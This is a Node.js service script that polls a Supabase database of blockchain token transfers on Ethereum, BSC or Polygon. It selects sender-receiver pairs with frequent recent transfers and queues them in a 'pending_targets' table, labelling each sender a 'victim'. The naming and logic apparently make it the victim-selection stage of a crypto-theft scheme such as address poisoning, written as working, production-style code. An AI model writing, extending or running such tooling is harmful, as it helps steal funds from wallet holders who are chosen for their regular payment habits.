import { createClient } from '@supabase/supabase-js';

import { config } from '../lib/config.js';
import logger from '../lib/logger.js';
import { sendAlert, formatAlert } from '../lib/notifier.js';
import { setupGracefulShutdown, onShutdown } from '../lib/shutdown.js';

// ─── Supabase client ───
const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
if (!supabaseUrl || !supabaseKey) {
  console.error('[observer] Missing Supabase credentials. Exiting.');
  process.exit(1);
}
const supabase = createClient(supabaseUrl, supabaseKey);

// --- Configuration from central config ---
const {
  files,
} = config;

// --- MULTI‑CHAIN: get chain‑specific configs ---
const chainName = config.chain || 'ethereum';
const chainCfg = config.getChainConfig ? config.getChainConfig() : null;
const chainId = chainCfg?.chainId || 1;

logger.info(`[Multi‑chain] Observer running for chain: ${chainName} (ID: ${chainId})`);

// --- Qualified pairs polling interval (default 10 minutes) ---
const QUALIFIED_POLL_INTERVAL_MS = parseInt(
  process.env.QUALIFIED_POLL_INTERVAL_MS || '600000',
  10
);

// --- Chain‑specific block count for 30 days (approximate) ---
const BLOCKS_30_DAYS_MAP = {
  ethereum: 216000n,   // ~13s blocks
  bsc:      864000n,   // ~3s blocks
  polygon:  1296000n,  // ~2s blocks
};
const BLOCKS_30_DAYS = BLOCKS_30_DAYS_MAP[chainName] || 216000n;

let isFetching = false;

// Robust retry wrapper for network/DB resilience
async function withRetry(fn, context, maxAttempts = 3, baseDelay = 1000) {
  let lastError;
  for (let attempt = 1; attempt <= maxAttempts; attempt++) {
    try {
      return await fn();
    } catch (error) {
      lastError = error;
      if (attempt < maxAttempts) {
        const delay = baseDelay * Math.pow(2, attempt - 1);
        logger.warn(`[${context}] Attempt ${attempt}/${maxAttempts} failed: ${error.message}`);
        await new Promise(resolve => setTimeout(resolve, delay));
      } else {
        break;
      }
    }
  }
  throw lastError;
}

async function fetchPendingTargets() {
  if (isFetching) {
    logger.warn('Database query is still running from the previous interval. Skipping.');
    return;
  }
  
  isFetching = true;

  try {
    logger.info('Fetching qualified pairs (frequency >= 7, last tx within 30 days)...');

    // 1. Get the max block number for this chain (using retry)
    const maxBlockData = await withRetry(async () => {
      const { data, error } = await supabase
        .from('token_transfers')
        .select('block_number')
        .eq('chain_id', chainId)
        .order('block_number', { ascending: false })
        .limit(1);

      if (error) throw error;
      return data;
    }, 'GetMaxBlock');

    if (!maxBlockData || maxBlockData.length === 0) {
      logger.info('No transfers found in database for this chain yet.');
      return;
    }

    const maxBlock = maxBlockData[0].block_number;
    const maxBlockBigInt = BigInt(maxBlock);
    const blockDiff = Number(maxBlockBigInt - BLOCKS_30_DAYS);
    const thresholdBlock = Math.max(0, blockDiff);

    logger.info(`Threshold block for 30-day window: ${thresholdBlock} (max block: ${maxBlock})`);

    // 2. Call the SQL function via RPC (using retry)
    const rows = await withRetry(async () => {
      const { data, error } = await supabase
        .rpc('fetch_pending_targets', {
          chain_id_param: chainId,
          threshold_block: thresholdBlock,
        });

      if (error) throw error;
      return data;
    }, 'FetchPendingTargetsRPC');

    if (!rows || rows.length === 0) {
      logger.info('No qualified pairs found in this run.');
      return;
    }

    logger.info(`Found ${rows.length} qualified pairs from RPC.`);

    // 3. Prepare data for dynamic bulk insert
    const insertData = rows.map((row) => ({
      chain: chainName,
      counterparty: row.receiver.toLowerCase(),
      victim: row.sender.toLowerCase(),
      processed: false,
    }));

    // 4. Perform a high-speed bulk upsert (Single DB Roundtrip!)
    const insertedCount = await withRetry(async () => {
      const { data, error } = await supabase
        .from('pending_targets')
        .upsert(insertData, {
          onConflict: 'chain,counterparty,victim', // Matches your composite unique constraint
          ignoreDuplicates: true,                  // Ignores conflicts (ON CONFLICT DO NOTHING)
        })
        .select(); // Returns only the newly inserted records

      if (error) throw error;
      return data ? data.length : 0;
    }, 'BulkUpsertTargets');

    logger.info(`Added ${insertedCount} new qualified pairs to pending_targets.`);

    if (insertedCount > 50) {
      await sendAlert(`📊 Found ${insertedCount} new qualified pairs.`);
    }

  } catch (error) {
    logger.error(`Error fetching qualified pairs: ${error.message}`);
    await sendAlert(formatAlert('error', { source: 'fetchPendingTargets', error: error.message }));
  } finally {
    isFetching = false;
  }
}

async function startObserver() {
  logger.info('Starting qualified‑targets poller (continuous mode)');
  logger.info(`Polling interval: ${QUALIFIED_POLL_INTERVAL_MS / 1000} seconds`);
  logger.info(`30‑day block window for ${chainName}: ${BLOCKS_30_DAYS} blocks`);

  await fetchPendingTargets();

  setInterval(async () => {
    try {
      await fetchPendingTargets();
    } catch (err) {
      logger.error(`Polling error: ${err.message}`);
    }
  }, QUALIFIED_POLL_INTERVAL_MS);
}

setupGracefulShutdown();
onShutdown(async () => {
  logger.info('Observer shutting down gracefully.');
});

startObserver().catch(async (err) => {
  logger.error(`Fatal error: ${err.message}`);
  await sendAlert(formatAlert('error', { source: 'startObserver', error: err.message }));
  process.exit(1);
});